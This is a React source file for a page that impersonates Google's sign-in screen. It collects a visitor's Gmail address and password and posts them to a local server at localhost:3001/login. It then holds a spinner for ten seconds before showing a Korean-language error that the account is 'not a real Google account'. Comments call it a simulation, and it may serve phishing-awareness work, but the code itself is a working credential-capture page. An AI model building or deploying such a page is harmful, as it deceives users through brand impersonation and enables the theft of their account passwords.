import React, { useState } from 'react';
import './GoogleLoginPage.css'; // Import dedicated CSS for GoogleLoginPage

const GoogleLoginPage = () => {
  const [emailPrefix, setEmailPrefix] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(''); // Clear previous errors

    const fullEmail = `${emailPrefix}@gmail.com`;

    try {
      const response = await fetch('http://localhost:3001/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email: fullEmail, password }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log('Server response:', data.message);
        // In a real app, you'd handle successful login here (e.g., redirect, store token)
        // For this simulation, we'll still show an error after a delay
        setTimeout(() => {
          setLoading(false);
          setError('실제 구글계정이 아닙니다. (서버 응답: ' + data.message + ')'); // "This is not a real Google account." (Server response: ...)
        }, 10000); // 10 seconds loading
      } else {
        console.error('Server error:', data.message);
        setLoading(false);
        setError('로그인 실패: ' + data.message); // Login failed: ...
      }
    } catch (err) {
      console.error('Network error:', err);
      setLoading(false);
      setError('네트워크 오류가 발생했습니다.'); // A network error occurred.
    }
  };

  return (
    <div className="google-login-container">
      <h1 className="google-login-title">Sign in to continue</h1>
      <p className="google-login-subtitle">
        Use your Google Account
      </p>
      <form onSubmit={handleSubmit} className="google-login-form">
        <div className="input-group">
          <div className="email-input-wrapper">
            <input
              type="text"
              placeholder="Email"
              value={emailPrefix}
              onChange={(e) => {
                const value = e.target.value;
                // Prevent @ and . characters in the email prefix
                if (!value.includes('@') && !value.includes('.')) {
                  setEmailPrefix(value);
                }
              }}
              className="email-prefix-input"
              required
            />
            <span className="email-suffix">@gmail.com</span>
          </div>
        </div>
        <div className="input-group">
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="password-input"
            required
          />
        </div>
        {error && <p className="error-message">{error}</p>}
        <button
          type="submit"
          disabled={loading}
          className="google-login-button-submit"
        >
          {loading ? (
            <div className="spinner"></div>
          ) : (
            'Next'
          )}
        </button>
      </form>
    </div>
  );
};

export default GoogleLoginPage;